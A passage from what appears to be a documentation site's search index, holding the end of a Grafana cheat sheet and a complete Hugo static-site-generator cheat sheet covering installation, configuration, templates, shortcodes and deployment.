</ul>"},{"location":"cheat-sheet/grafana/grafana/#keyboard-shortcuts","title":"Keyboard Shortcuts","text":"Shortcut Action <code>g + h</code> Go to home dashboard <code>g + p</code> Go to profile <code>g + e</code> Open explore <code>s</code> Open search <code>f</code> Open dashboard finder <code>d + k</code> Toggle kiosk mode <code>d + e</code> Expand all rows <code>d + s</code> Dashboard settings <code>d + v</code> Toggle in-active/active panel <code>Ctrl + S</code> Save dashboard <code>Esc</code> Exit panel edit/settings <code>?</code> Show keyboard shortcuts"},{"location":"cheat-sheet/grafana/grafana/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://grafana.com/docs/</li> <li>Community dashboards: https://grafana.com/grafana/dashboards/</li> <li>Plugins: https://grafana.com/grafana/plugins/</li> <li>Tutorials: https://grafana.com/tutorials/</li> <li>Community forum: https://community.grafana.com/</li> <li>GitHub: https://github.com/grafana/grafana</li> </ul>"},{"location":"cheat-sheet/hugo/hugo/","title":"Hugo Cheat Sheet","text":""},{"location":"cheat-sheet/hugo/hugo/#overview","title":"Overview","text":"<p>Hugo is the world's fastest framework for building static websites, written in Go.</p> <p>Key Features: - Extremely fast build times (&lt; 1ms per page) - Simple and easy to use - No dependencies (single binary) - Flexible content organization - Powerful templating system - Built-in live reload - Multilingual support</p>"},{"location":"cheat-sheet/hugo/hugo/#installation","title":"Installation","text":""},{"location":"cheat-sheet/hugo/hugo/#macos","title":"macOS","text":"<pre><code># Using Homebrew\nbrew install hugo\n\n# Extended version (with Sass/SCSS support)\nbrew install hugo\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#linux","title":"Linux","text":"<pre><code># Debian/Ubuntu\nsudo apt install hugo\n\n# Arch Linux\nsudo pacman -S hugo\n\n# Snap\nsudo snap install hugo\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#windows","title":"Windows","text":"<pre><code># Using Chocolatey\nchoco install hugo-extended\n\n# Using Scoop\nscoop install hugo-extended\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#from-binary","title":"From Binary","text":"<p>Download from https://github.com/gohugoio/hugo/releases</p>"},{"location":"cheat-sheet/hugo/hugo/#verify-installation","title":"Verify Installation","text":"<pre><code>hugo version\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#quick-start","title":"Quick Start","text":""},{"location":"cheat-sheet/hugo/hugo/#create-new-site","title":"Create New Site","text":"<pre><code>hugo new site mysite\ncd mysite\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#initialize-git","title":"Initialize Git","text":"<pre><code>git init\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#add-a-theme","title":"Add a Theme","text":"<pre><code># Add theme as Git submodule\ngit submodule add https://github.com/theNewDynamic/gohugo-theme-ananke.git themes/ananke\n\n# Set theme in config\necho \"theme = 'ananke'\" &gt;&gt; hugo.toml\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#create-content","title":"Create Content","text":"<pre><code>hugo new posts/my-first-post.md\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#start-development-server","title":"Start Development Server","text":"<pre><code>hugo server\n\n# With drafts\nhugo server -D\n\n# With custom port\nhugo server -p 1313\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#build-site","title":"Build Site","text":"<pre><code>hugo\n\n# Include drafts\nhugo -D\n\n# Clean before build\nhugo --cleanDestinationDir\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#directory-structure","title":"Directory Structure","text":"<pre><code>mysite/\n\u251c\u2500\u2500 archetypes/          # Content templates\n\u2502   \u2514\u2500\u2500 default.md\n\u251c\u2500\u2500 assets/              # Files to be processed (SCSS, JS)\n\u251c\u2500\u2500 content/             # All content (markdown files)\n\u2502   \u251c\u2500\u2500 posts/\n\u2502   \u2514\u2500\u2500 about.md\n\u251c\u2500\u2500 data/                # Data files (JSON, YAML, TOML)\n\u251c\u2500\u2500 layouts/             # Templates and views\n\u2502   \u251c\u2500\u2500 _default/\n\u2502   \u251c\u2500\u2500 partials/\n\u2502   \u2514\u2500\u2500 shortcodes/\n\u251c\u2500\u2500 static/              # Static files (images, CSS, JS)\n\u2502   \u251c\u2500\u2500 images/\n\u2502   \u2514\u2500\u2500 css/\n\u251c\u2500\u2500 themes/              # Themes directory\n\u251c\u2500\u2500 hugo.toml           # Main configuration file\n\u2514\u2500\u2500 public/             # Generated site (gitignored)\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#configuration","title":"Configuration","text":""},{"location":"cheat-sheet/hugo/hugo/#configuration-file-hugotoml","title":"Configuration File (hugo.toml)","text":"<pre><code>baseURL = 'https://example.com/'\nlanguageCode = 'en-us'\ntitle = 'My Hugo Site'\ntheme = 'ananke'\n\n[params]\n  description = 'A Hugo site'\n  author = 'John Doe'\n\n[menu]\n  [[menu.main]]\n    name = 'Home'\n    url = '/'\n    weight = 1\n  [[menu.main]]\n    name = 'Posts'\n    url = '/posts/'\n    weight = 2\n  [[menu.main]]\n    name = 'About'\n    url = '/about/'\n    weight = 3\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#configuration-yaml","title":"Configuration (YAML)","text":"<pre><code>baseURL: https://example.com/\nlanguageCode: en-us\ntitle: My Hugo Site\ntheme: ananke\n\nparams:\n  description: A Hugo site\n  author: John Doe\n\nmenu:\n  main:\n    - name: Home\n      url: /\n      weight: 1\n    - name: Posts\n      url: /posts/\n      weight: 2\n    - name: About\n      url: /about/\n      weight: 3\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#important-configuration-options","title":"Important Configuration Options","text":"<pre><code>baseURL = 'https://example.com/'\ntitle = 'My Site'\ntheme = 'mytheme'\nlanguageCode = 'en-us'\ndefaultContentLanguage = 'en'\n\n# Content\ncontentDir = 'content'\ndataDir = 'data'\nlayoutDir = 'layouts'\npublishDir = 'public'\n\n# Build\nbuildDrafts = false\nbuildFuture = false\nbuildExpired = false\n\n# Server\ndisableLiveReload = false\n\n# Permalinks\n[permalinks]\n  posts = '/:year/:month/:slug/'\n\n# Taxonomies\n[taxonomies]\n  tag = 'tags'\n  category = 'categories'\n  series = 'series'\n\n# Markup\n[markup]\n  [markup.goldmark]\n    [markup.goldmark.renderer]\n      unsafe = true  # Allow HTML in markdown\n\n# Params (custom variables)\n[params]\n  dateFormat = 'January 2, 2006'\n  description = 'Site description'\n  author = 'Author Name'\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#front-matter","title":"Front Matter","text":""},{"location":"cheat-sheet/hugo/hugo/#yaml-front-matter","title":"YAML Front Matter","text":"<pre><code>---\ntitle: \"My First Post\"\ndate: 2025-01-15T10:00:00Z\ndraft: false\ndescription: \"This is my first post\"\ntags: [\"hugo\", \"blogging\"]\ncategories: [\"tutorial\"]\nauthor: \"John Doe\"\nimage: \"/images/post-1.jpg\"\nweight: 1\n---\n\nYour content here...\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#toml-front-matter","title":"TOML Front Matter","text":"<pre><code>+++\ntitle = \"My First Post\"\ndate = 2025-01-15T10:00:00Z\ndraft = false\ndescription = \"This is my first post\"\ntags = [\"hugo\", \"blogging\"]\ncategories = [\"tutorial\"]\nauthor = \"John Doe\"\nimage = \"/images/post-1.jpg\"\nweight = 1\n+++\n\nYour content here...\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#json-front-matter","title":"JSON Front Matter","text":"<pre><code>{\n  \"title\": \"My First Post\",\n  \"date\": \"2025-01-15T10:00:00Z\",\n  \"draft\": false,\n  \"description\": \"This is my first post\",\n  \"tags\": [\"hugo\", \"blogging\"],\n  \"categories\": [\"tutorial\"],\n  \"author\": \"John Doe\",\n  \"image\": \"/images/post-1.jpg\",\n  \"weight\": 1\n}\n\nYour content here...\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#common-front-matter-variables","title":"Common Front Matter Variables","text":"<pre><code>---\n# Required\ntitle: \"Post Title\"\ndate: 2025-01-15\n\n# Publishing\ndraft: false              # Don't publish if true\npublishDate: 2025-01-15  # Publish on this date\nexpiryDate: 2026-01-15   # Unpublish after this date\n\n# Organization\nweight: 10               # Order in lists\nslug: \"my-custom-url\"    # Custom URL slug\naliases: [\"/old-url/\"]   # URL redirects\n\n# Taxonomies\ntags: [\"tag1\", \"tag2\"]\ncategories: [\"category1\"]\n\n# Display\ndescription: \"Meta description\"\nsummary: \"Custom summary\"\nimages: [\"/img/cover.jpg\"]\n\n# Custom params\nauthor: \"Author Name\"\nfeatured: true\n---\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#content-management","title":"Content Management","text":""},{"location":"cheat-sheet/hugo/hugo/#create-content_1","title":"Create Content","text":"<pre><code># Create post\nhugo new posts/my-post.md\n\n# Create page\nhugo new about.md\n\n# Create in section\nhugo new blog/article-1.md\n\n# Use custom archetype\nhugo new --kind chapter docs/chapter1.md\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#content-organization","title":"Content Organization","text":"<pre><code>content/\n\u251c\u2500\u2500 _index.md              # Home page content\n\u251c\u2500\u2500 about.md              # Single page\n\u251c\u2500\u2500 posts/\n\u2502   \u251c\u2500\u2500 _index.md         # Posts list page\n\u2502   \u251c\u2500\u2500 post-1.md\n\u2502   \u2514\u2500\u2500 post-2.md\n\u2514\u2500\u2500 docs/\n    \u251c\u2500\u2500 _index.md\n    \u251c\u2500\u2500 getting-started/\n    \u2502   \u251c\u2500\u2500 _index.md\n    \u2502   \u2514\u2500\u2500 installation.md\n    \u2514\u2500\u2500 advanced/\n        \u2514\u2500\u2500 configuration.md\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#page-bundles","title":"Page Bundles","text":""},{"location":"cheat-sheet/hugo/hugo/#leaf-bundle","title":"Leaf Bundle","text":"<pre><code>content/\n\u2514\u2500\u2500 posts/\n    \u2514\u2500\u2500 my-post/\n        \u251c\u2500\u2500 index.md      # The content file\n        \u251c\u2500\u2500 image1.jpg\n        \u2514\u2500\u2500 image2.jpg\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#branch-bundle","title":"Branch Bundle","text":"<pre><code>content/\n\u2514\u2500\u2500 posts/\n    \u251c\u2500\u2500 _index.md        # List page\n    \u251c\u2500\u2500 post-1.md\n    \u2514\u2500\u2500 post-2.md\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#archetypes","title":"Archetypes","text":""},{"location":"cheat-sheet/hugo/hugo/#default-archetype-archetypesdefaultmd","title":"Default Archetype (archetypes/default.md)","text":"<pre><code>---\ntitle: \"{{ replace .File.ContentBaseName \"-\" \" \" | title }}\"\ndate: {{ .Date }}\ndraft: true\ntags: []\ncategories: []\n---\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#custom-archetype-archetypespostsmd","title":"Custom Archetype (archetypes/posts.md)","text":"<pre><code>---\ntitle: \"{{ replace .File.ContentBaseName \"-\" \" \" | title }}\"\ndate: {{ .Date }}\ndraft: false\nauthor: \"{{ .Site.Params.author }}\"\ntags: []\ncategories: []\nfeatured_image: \"\"\ndescription: \"\"\n---\n\n## Introduction\n\nYour content here...\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#use-custom-archetype","title":"Use Custom Archetype","text":"<pre><code>hugo new posts/my-post.md --kind posts\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#templates","title":"Templates","text":""},{"location":"cheat-sheet/hugo/hugo/#basic-template-structure","title":"Basic Template Structure","text":"<pre><code>layouts/\n\u251c\u2500\u2500 _default/\n\u2502   \u251c\u2500\u2500 baseof.html      # Base template\n\u2502   \u251c\u2500\u2500 list.html        # List pages\n\u2502   \u251c\u2500\u2500 single.html      # Single pages\n\u2502   \u2514\u2500\u2500 index.html       # Home page\n\u251c\u2500\u2500 partials/\n\u2502   \u251c\u2500\u2500 header.html\n\u2502   \u251c\u2500\u2500 footer.html\n\u2502   \u2514\u2500\u2500 head.html\n\u251c\u2500\u2500 shortcodes/\n\u2502   \u2514\u2500\u2500 myshortcode.html\n\u2514\u2500\u2500 index.html\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#base-template-baseofhtml","title":"Base Template (baseof.html)","text":"<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"{{ .Site.LanguageCode }}\"&gt;\n&lt;head&gt;\n    {{ partial \"head.html\" . }}\n&lt;/head&gt;\n&lt;body&gt;\n    {{ partial \"header.html\" . }}\n\n    &lt;main&gt;\n        {{ block \"main\" . }}{{ end }}\n    &lt;/main&gt;\n\n    {{ partial \"footer.html\" . }}\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#single-page-template-singlehtml","title":"Single Page Template (single.html)","text":"<pre><code>{{ define \"main\" }}\n&lt;article&gt;\n    &lt;h1&gt;{{ .Title }}&lt;/h1&gt;\n    &lt;time&gt;{{ .Date.Format \"January 2, 2006\" }}&lt;/time&gt;\n\n    {{ .Content }}\n\n    &lt;div class=\"tags\"&gt;\n        {{ range .Params.tags }}\n        &lt;a href=\"{{ \"/tags/\" | relURL }}{{ . | urlize }}\"&gt;{{ . }}&lt;/a&gt;\n        {{ end }}\n    &lt;/div&gt;\n&lt;/article&gt;\n{{ end }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#list-template-listhtml","title":"List Template (list.html)","text":"<pre><code>{{ define \"main\" }}\n&lt;h1&gt;{{ .Title }}&lt;/h1&gt;\n\n{{ .Content }}\n\n&lt;ul&gt;\n{{ range .Pages }}\n    &lt;li&gt;\n        &lt;a href=\"{{ .RelPermalink }}\"&gt;{{ .Title }}&lt;/a&gt;\n        &lt;time&gt;{{ .Date.Format \"Jan 2, 2006\" }}&lt;/time&gt;\n        &lt;p&gt;{{ .Summary }}&lt;/p&gt;\n    &lt;/li&gt;\n{{ end }}\n&lt;/ul&gt;\n{{ end }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#home-page-template-indexhtml","title":"Home Page Template (index.html)","text":"<pre><code>{{ define \"main\" }}\n&lt;h1&gt;Welcome to {{ .Site.Title }}&lt;/h1&gt;\n\n&lt;section class=\"recent-posts\"&gt;\n    &lt;h2&gt;Recent Posts&lt;/h2&gt;\n    {{ range first 5 (where .Site.RegularPages \"Type\" \"posts\") }}\n    &lt;article&gt;\n        &lt;h3&gt;&lt;a href=\"{{ .RelPermalink }}\"&gt;{{ .Title }}&lt;/a&gt;&lt;/h3&gt;\n        &lt;time&gt;{{ .Date.Format \"January 2, 2006\" }}&lt;/time&gt;\n        &lt;p&gt;{{ .Summary }}&lt;/p&gt;\n    &lt;/article&gt;\n    {{ end }}\n&lt;/section&gt;\n{{ end }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#partial-template-partialsheaderhtml","title":"Partial Template (partials/header.html)","text":"<pre><code>&lt;header&gt;\n    &lt;nav&gt;\n        &lt;a href=\"{{ .Site.BaseURL }}\"&gt;{{ .Site.Title }}&lt;/a&gt;\n        {{ range .Site.Menus.main }}\n        &lt;a href=\"{{ .URL }}\"&gt;{{ .Name }}&lt;/a&gt;\n        {{ end }}\n    &lt;/nav&gt;\n&lt;/header&gt;\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#variables","title":"Variables","text":""},{"location":"cheat-sheet/hugo/hugo/#site-variables","title":"Site Variables","text":"<pre><code>{{ .Site.Title }}\n{{ .Site.BaseURL }}\n{{ .Site.Params.description }}\n{{ .Site.LanguageCode }}\n{{ .Site.LastChange }}\n{{ .Site.Pages }}\n{{ .Site.RegularPages }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#page-variables","title":"Page Variables","text":"<pre><code>{{ .Title }}\n{{ .Content }}\n{{ .Summary }}\n{{ .Description }}\n{{ .Date }}\n{{ .PublishDate }}\n{{ .Permalink }}\n{{ .RelPermalink }}\n{{ .WordCount }}\n{{ .ReadingTime }}\n{{ .Params.author }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#page-collections","title":"Page Collections","text":"<pre><code>{{ range .Pages }}\n    {{ .Title }}\n{{ end }}\n\n{{ range .Site.RegularPages }}\n    {{ .Title }}\n{{ end }}\n\n{{ range first 5 .Site.RegularPages }}\n    {{ .Title }}\n{{ end }}\n\n{{ range where .Site.RegularPages \"Type\" \"posts\" }}\n    {{ .Title }}\n{{ end }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#functions","title":"Functions","text":""},{"location":"cheat-sheet/hugo/hugo/#common-functions","title":"Common Functions","text":"<pre><code>&lt;!-- String functions --&gt;\n{{ upper \"hello\" }}          &lt;!-- HELLO --&gt;\n{{ lower \"HELLO\" }}          &lt;!-- hello --&gt;\n{{ title \"hello world\" }}    &lt;!-- Hello World --&gt;\n{{ replace \"hello\" \"l\" \"w\" }} &lt;!-- hewwo --&gt;\n\n&lt;!-- Math functions --&gt;\n{{ add 1 2 }}                &lt;!-- 3 --&gt;\n{{ sub 5 3 }}                &lt;!-- 2 --&gt;\n{{ mul 2 3 }}                &lt;!-- 6 --&gt;\n{{ div 10 2 }}               &lt;!-- 5 --&gt;\n\n&lt;!-- Date functions --&gt;\n{{ .Date.Format \"January 2, 2006\" }}\n{{ now.Format \"2006-01-02\" }}\n{{ dateFormat \"2006-01-02\" .Date }}\n\n&lt;!-- Conditionals --&gt;\n{{ if .Params.featured }}\n    Featured post\n{{ end }}\n\n{{ if eq .Type \"posts\" }}\n    This is a post\n{{ else }}\n    This is a page\n{{ end }}\n\n&lt;!-- Range --&gt;\n{{ range .Pages }}\n    {{ .Title }}\n{{ end }}\n\n&lt;!-- With --&gt;\n{{ with .Params.author }}\n    Author: {{ . }}\n{{ end }}\n\n&lt;!-- Slice functions --&gt;\n{{ range first 5 .Pages }}\n    {{ .Title }}\n{{ end }}\n\n{{ range after 5 .Pages }}\n    {{ .Title }}\n{{ end }}\n\n&lt;!-- Where --&gt;\n{{ range where .Site.RegularPages \"Type\" \"posts\" }}\n    {{ .Title }}\n{{ end }}\n\n{{ range where .Pages \".Params.featured\" true }}\n    {{ .Title }}\n{{ end }}\n\n&lt;!-- URLs --&gt;\n{{ .Permalink }}\n{{ .RelPermalink }}\n{{ relURL \"about\" }}\n{{ absURL \"about\" }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#shortcodes","title":"Shortcodes","text":""},{"location":"cheat-sheet/hugo/hugo/#built-in-shortcodes","title":"Built-in Shortcodes","text":"<pre><code>&lt;!-- YouTube video --&gt;\n{{&lt; youtube VIDEO_ID &gt;}}\n\n&lt;!-- Vimeo video --&gt;\n{{&lt; vimeo VIDEO_ID &gt;}}\n\n&lt;!-- Tweet --&gt;\n{{&lt; twitter TWEET_ID &gt;}}\n\n&lt;!-- Instagram --&gt;\n{{&lt; instagram POST_ID &gt;}}\n\n&lt;!-- Gist --&gt;\n{{&lt; gist USERNAME GIST_ID &gt;}}\n\n&lt;!-- Figure (image with caption) --&gt;\n{{&lt; figure src=\"/images/photo.jpg\" title=\"Photo Title\" &gt;}}\n\n&lt;!-- Highlight (syntax highlighting) --&gt;\n{{&lt; highlight python &gt;}}\ndef hello():\n    print(\"Hello\")\n{{&lt; /highlight &gt;}}\n\n&lt;!-- Ref (reference to page) --&gt;\n{{&lt; ref \"about.md\" &gt;}}\n\n&lt;!-- Relref (relative reference) --&gt;\n{{&lt; relref \"posts/my-post.md\" &gt;}}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#custom-shortcode-layoutsshortcodesbuttonhtml","title":"Custom Shortcode (layouts/shortcodes/button.html)","text":"<pre><code>&lt;a href=\"{{ .Get \"url\" }}\" class=\"button\"&gt;\n    {{ .Inner }}\n&lt;/a&gt;\n</code></pre> <p>Usage: <pre><code>{{&lt; button url=\"/contact\" &gt;}}Contact Us{{&lt; /button &gt;}}\n</code></pre></p>"},{"location":"cheat-sheet/hugo/hugo/#shortcode-with-named-parameters","title":"Shortcode with Named Parameters","text":"<pre><code>&lt;!-- layouts/shortcodes/alert.html --&gt;\n&lt;div class=\"alert alert-{{ .Get \"type\" }}\"&gt;\n    {{ .Inner }}\n&lt;/div&gt;\n</code></pre> <p>Usage: <pre><code>{{&lt; alert type=\"warning\" &gt;}}\nThis is a warning message!\n{{&lt; /alert &gt;}}\n</code></pre></p>"},{"location":"cheat-sheet/hugo/hugo/#shortcode-with-positional-parameters","title":"Shortcode with Positional Parameters","text":"<pre><code>&lt;!-- layouts/shortcodes/image.html --&gt;\n&lt;img src=\"{{ .Get 0 }}\" alt=\"{{ .Get 1 }}\"&gt;\n</code></pre> <p>Usage: <pre><code>{{&lt; image \"/images/photo.jpg\" \"Photo description\" &gt;}}\n</code></pre></p>"},{"location":"cheat-sheet/hugo/hugo/#taxonomies","title":"Taxonomies","text":""},{"location":"cheat-sheet/hugo/hugo/#configure-taxonomies-hugotoml","title":"Configure Taxonomies (hugo.toml)","text":"<pre><code>[taxonomies]\n  tag = 'tags'\n  category = 'categories'\n  author = 'authors'\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#use-in-front-matter","title":"Use in Front Matter","text":"<pre><code>---\ntitle: \"My Post\"\ntags: [\"hugo\", \"web\"]\ncategories: [\"tutorial\"]\nauthors: [\"john\"]\n---\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#list-taxonomy-terms","title":"List Taxonomy Terms","text":"<pre><code>&lt;!-- List all tags --&gt;\n&lt;ul&gt;\n{{ range .Site.Taxonomies.tags }}\n    &lt;li&gt;&lt;a href=\"{{ .Page.Permalink }}\"&gt;{{ .Page.Title }}&lt;/a&gt; ({{ .Count }})&lt;/li&gt;\n{{ end }}\n&lt;/ul&gt;\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#display-terms-on-page","title":"Display Terms on Page","text":"<pre><code>&lt;div class=\"tags\"&gt;\n{{ range .Params.tags }}\n    &lt;a href=\"{{ \"tags\" | relURL }}/{{ . | urlize }}\"&gt;{{ . }}&lt;/a&gt;\n{{ end }}\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#menus","title":"Menus","text":""},{"location":"cheat-sheet/hugo/hugo/#configure-in-hugotoml","title":"Configure in hugo.toml","text":"<pre><code>[[menu.main]]\n  name = 'Home'\n  url = '/'\n  weight = 1\n\n[[menu.main]]\n  name = 'Posts'\n  url = '/posts/'\n  weight = 2\n\n[[menu.main]]\n  name = 'About'\n  url = '/about/'\n  weight = 3\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#configure-in-front-matter","title":"Configure in Front Matter","text":"<pre><code>---\ntitle: \"About\"\nmenu:\n  main:\n    name: \"About\"\n    weight: 3\n---\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#render-menu","title":"Render Menu","text":"<pre><code>&lt;nav&gt;\n{{ range .Site.Menus.main }}\n    &lt;a href=\"{{ .URL }}\"&gt;{{ .Name }}&lt;/a&gt;\n{{ end }}\n&lt;/nav&gt;\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#data-files","title":"Data Files","text":""},{"location":"cheat-sheet/hugo/hugo/#json-data-file-dataauthorsjson","title":"JSON Data File (data/authors.json)","text":"<pre><code>{\n  \"john\": {\n    \"name\": \"John Doe\",\n    \"bio\": \"Software Developer\",\n    \"twitter\": \"@johndoe\"\n  },\n  \"jane\": {\n    \"name\": \"Jane Smith\",\n    \"bio\": \"Designer\",\n    \"twitter\": \"@janesmith\"\n  }\n}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#use-in-templates","title":"Use in Templates","text":"<pre><code>{{ $author := index .Site.Data.authors .Params.author }}\n&lt;div class=\"author\"&gt;\n    &lt;h3&gt;{{ $author.name }}&lt;/h3&gt;\n    &lt;p&gt;{{ $author.bio }}&lt;/p&gt;\n    &lt;a href=\"https://twitter.com/{{ $author.twitter }}\"&gt;Twitter&lt;/a&gt;\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#yaml-data-file-datasocialyaml","title":"YAML Data File (data/social.yaml)","text":"<pre><code>twitter: https://twitter.com/username\ngithub: https://github.com/username\nlinkedin: https://linkedin.com/in/username\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#use-in-templates_1","title":"Use in Templates","text":"<pre><code>&lt;div class=\"social\"&gt;\n{{ range $name, $url := .Site.Data.social }}\n    &lt;a href=\"{{ $url }}\"&gt;{{ $name }}&lt;/a&gt;\n{{ end }}\n&lt;/div&gt;\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#image-processing","title":"Image Processing","text":""},{"location":"cheat-sheet/hugo/hugo/#using-page-resources","title":"Using Page Resources","text":"<pre><code>{{ with .Resources.GetMatch \"featured.jpg\" }}\n  {{ $image := .Resize \"600x\" }}\n  &lt;img src=\"{{ $image.RelPermalink }}\" width=\"{{ $image.Width }}\" height=\"{{ $image.Height }}\"&gt;\n{{ end }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#image-operations","title":"Image Operations","text":"<pre><code>{{ $image := resources.Get \"images/photo.jpg\" }}\n\n&lt;!-- Resize --&gt;\n{{ $resized := $image.Resize \"600x\" }}\n\n&lt;!-- Fit (crop to exact dimensions) --&gt;\n{{ $fitted := $image.Fit \"300x300\" }}\n\n&lt;!-- Fill (crop and resize) --&gt;\n{{ $filled := $image.Fill \"400x300\" }}\n\n&lt;!-- Filters --&gt;\n{{ $grayscale := $image | images.Grayscale }}\n{{ $blurred := $image | images.GaussianBlur 5 }}\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#deployment","title":"Deployment","text":""},{"location":"cheat-sheet/hugo/hugo/#build-for-production","title":"Build for Production","text":"<pre><code># Basic build\nhugo\n\n# Build with minification\nhugo --minify\n\n# Set base URL\nhugo --baseURL https://example.com/\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#deploy-to-netlify","title":"Deploy to Netlify","text":"<p>netlify.toml: <pre><code>[build]\n  publish = \"public\"\n  command = \"hugo --gc --minify\"\n\n[build.environment]\n  HUGO_VERSION = \"0.121.0\"\n  HUGO_ENV = \"production\"\n\n[[redirects]]\n  from = \"/old-path\"\n  to = \"/new-path\"\n  status = 301\n</code></pre></p>"},{"location":"cheat-sheet/hugo/hugo/#deploy-to-github-pages","title":"Deploy to GitHub Pages","text":"<p>.github/workflows/hugo.yml: <pre><code>name: Deploy Hugo site to Pages\n\non:\n  push:\n    branches: [\"main\"]\n  workflow_dispatch:\n\npermissions:\n  contents: read\n  pages: write\n  id-token: write\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v4\n        with:\n          submodules: recursive\n\n      - name: Setup Hugo\n        uses: peaceiris/actions-hugo@v2\n        with:\n          hugo-version: 'latest'\n          extended: true\n\n      - name: Build\n        run: hugo --minify\n\n      - name: Upload artifact\n        uses: actions/upload-pages-artifact@v3\n        with:\n          path: ./public\n\n  deploy:\n    environment:\n      name: github-pages\n      url: ${{ steps.deployment.outputs.page_url }}\n    runs-on: ubuntu-latest\n    needs: build\n    steps:\n      - name: Deploy to GitHub Pages\n        id: deployment\n        uses: actions/deploy-pages@v4\n</code></pre></p>"},{"location":"cheat-sheet/hugo/hugo/#deploy-to-vercel","title":"Deploy to Vercel","text":"<p>vercel.json: <pre><code>{\n  \"build\": {\n    \"env\": {\n      \"HUGO_VERSION\": \"0.121.0\"\n    }\n  }\n}\n</code></pre></p>"},{"location":"cheat-sheet/hugo/hugo/#deploy-to-cloudflare-pages","title":"Deploy to Cloudflare Pages","text":"<p>Build settings: - Build command: <code>hugo --minify</code> - Build output directory: <code>public</code></p>"},{"location":"cheat-sheet/hugo/hugo/#command-line","title":"Command Line","text":""},{"location":"cheat-sheet/hugo/hugo/#common-commands","title":"Common Commands","text":"<pre><code># Create new site\nhugo new site mysite\n\n# Create new content\nhugo new posts/my-post.md\n\n# Start dev server\nhugo server\n\n# Start with drafts\nhugo server -D\n\n# Build site\nhugo\n\n# Build with options\nhugo --minify --gc\n\n# List content\nhugo list all\nhugo list drafts\nhugo list future\n\n# Check configuration\nhugo config\n\n# Create new theme\nhugo new theme mytheme\n\n# Convert content\nhugo convert toTOML\nhugo convert toYAML\nhugo convert toJSON\n\n# Run benchmarks\nhugo benchmark\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#environment-variables","title":"Environment Variables","text":"<pre><code># Set environment\nHUGO_ENV=production hugo\n\n# Set log level\nHUGO_LOG_LEVEL=debug hugo server\n</code></pre>"},{"location":"cheat-sheet/hugo/hugo/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/hugo/hugo/#content-organization_1","title":"Content Organization","text":"<ul> <li>Use page bundles for posts with images</li> <li>Organize content into logical sections</li> <li>Use consistent front matter</li> <li>Add descriptions for SEO</li> </ul>"},{"location":"cheat-sheet/hugo/hugo/#performance","title":"Performance","text":"<ul> <li>Optimize images before adding to <code>static/</code></li> <li>Use Hugo's image processing for responsive images</li> <li>Minify output with <code>hugo --minify</code></li> <li>Use <code>--gc</code> flag to clean cache</li> </ul>"},{"location":"cheat-sheet/hugo/hugo/#development","title":"Development","text":"<ul> <li>Use <code>hugo server -D</code> during development</li> <li>Test with different base URLs</li> <li>Version control your theme</li> <li>Use <code>.gitignore</code> for <code>public/</code> and <code>resources/</code></li> </ul>"},{"location":"cheat-sheet/hugo/hugo/#templates_1","title":"Templates","text":"<ul> <li>Keep templates DRY (Don't Repeat Yourself)</li> <li>Use partials for reusable components</li> <li>Cache partial results when possible</li> <li>Use <code>.Scratch</code> for complex operations</li> </ul>"},{"location":"cheat-sheet/hugo/hugo/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://gohugo.io/documentation/</li> <li>Themes: https://themes.gohugo.io/</li> <li>Community forum: https://discourse.gohugo.io/</li> <li>GitHub: https://github.com/gohugoio/hugo</li> <li>Quick start: 